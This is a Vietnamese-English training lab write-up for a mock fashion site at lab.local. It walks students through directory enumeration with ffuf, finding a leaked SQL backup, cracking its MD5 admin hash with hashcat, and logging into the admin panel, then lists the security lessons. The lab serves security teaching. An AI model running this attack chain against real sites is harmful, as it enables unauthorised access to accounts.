# Lab 1.1 – The Leaky Web Root (Weak Hash Crack)

**Topic:** Directory Enumeration + Weak Password Hash Cracking
**Difficulty:** Easy → Medium
**Category:** Web Security / Reconnaissance
**Goal:** Obtain the admin credentials by discovering a leaked database backup and cracking a weak password hash.

---

# 1. Scenario

Công ty **BlueMoon Fashion** vừa triển khai website mới cho hệ thống bán quần áo nam.

Developer cho rằng website chỉ là **static site** nên không có rủi ro bảo mật đáng kể. Tuy nhiên trong quá trình triển khai, họ đã:

* Vô tình để lộ **robots.txt**
* Không xóa **thư mục backup**
* Để lộ **file database backup**
* Lưu **password admin dưới dạng hash yếu (MD5)**

Một attacker có thể thực hiện **directory enumeration**, tìm được **file backup**, trích xuất **password hash**, sau đó **crack bằng Hashcat** để đăng nhập vào **admin panel**.

---

# 2. Learning Objectives

Sau khi hoàn thành lab, sinh viên sẽ học được:

* Directory brute-force
* Hidden file discovery
* robots.txt analysis
* Sensitive backup file discovery
* Password hash identification
* Cracking weak hashes using Hashcat
* Accessing hidden admin panel

---

# 3. Lab Architecture

```
Student (Kali Linux)
        |
        | HTTP
        v
Docker Web Server

/
├── index.html
├── products.html
├── robots.txt
│
├── backup/
│   └── db_backup.sql
│
├── admin/
│   └── login.php
│
└── assets/
```

---

# 4. Website Structure

Main page:

```
Welcome to BlueMoon Fashion
Discover our newest men fashion collection.
```

Menu:

```
/products.html
/about.html
/contact.html
```

Không có link nào dẫn đến:

```
/backup
/admin
```

---

# 5. Hidden Clue – robots.txt

File:

```
http://lab.local/robots.txt
```

Content:

```
User-agent: *
Disallow: /backup/
```

Hint rằng có một **thư mục nhạy cảm bị ẩn**.

---

# 6. Student Tasks

Sinh viên cần thực hiện:

1. Enumerate directories
2. Discover hidden backup directory
3. Download database backup
4. Identify password hash
5. Crack hash using Hashcat
6. Login into admin panel

---

# 7. Step 1 – Directory Enumeration

Sử dụng tool:

```
ffuf
gobuster
dirsearch
dirb
```

Ví dụ:

```
ffuf -u http://lab.local/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Expected output:

```
/backup
/admin
```

---

# 8. Step 2 – Discover Backup File

Truy cập:

```
http://lab.local/backup/
```

File tìm thấy:

```
db_backup.sql
```

Download file:

```
curl http://lab.local/backup/db_backup.sql
```

---

# 9. Step 3 – Extract Password Hash

Nội dung file SQL:

```sql
CREATE TABLE users (
id INT,
username VARCHAR(50),
password VARCHAR(100)
);

INSERT INTO users VALUES
(1,'admin','5f4dcc3b5aa765d61d8327deb882cf99');
```

Hash này là:

```
MD5
```

---

# 10. Step 4 – Crack Password Using Hashcat

Lưu hash vào file:

```
hash.txt
```

```
5f4dcc3b5aa765d61d8327deb882cf99
```

Chạy Hashcat:

```
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Expected result:

```
password
```

---

# 11. Step 5 – Login Admin Panel

Truy cập:

```
http://lab.local/admin/login.php
```

Credential:

```
username: admin
password: password
```

Sau khi login thành công, trang hiển thị:

```
Welcome Admin
You have successfully accessed the internal admin panel.
```

Lab kết thúc tại bước này.

---

# 12. Expected Attack Chain

```
Recon
 ↓
Directory Enumeration
 ↓
robots.txt discovery
 ↓
Backup SQL leak
 ↓
Password hash discovery
 ↓
Hash cracking (Hashcat)
 ↓
Admin login
```

---

# 13. Key Security Lessons

Các lỗi phổ biến được minh họa trong lab:

* Hidden directories không phải là bảo mật
* robots.txt có thể tiết lộ thông tin nhạy cảm
* Backup file không được xóa
* Lưu password bằng hash yếu (MD5)
* Không có rate limit cho login

---

# 14. Example Credential

```
admin : password
```

---

# 15. Tools Recommended

```
ffuf
gobuster
dirsearch
curl
hashcat
burpsuite
```

---

# 16. Example Flag (Optional)

Nếu muốn thêm flag sau khi login:

```
FLAG{weak_hashes_are_dangerous}
```

---

# 17. Lab Outcome

Sau khi hoàn thành lab này sinh viên sẽ hiểu:

* Enumeration là bước quan trọng trong pentest
* Backup leak là lỗi phổ biến trong production
* Password hash yếu có thể bị crack rất nhanh
* Một chuỗi lỗi nhỏ có thể dẫn đến **admin compromise**
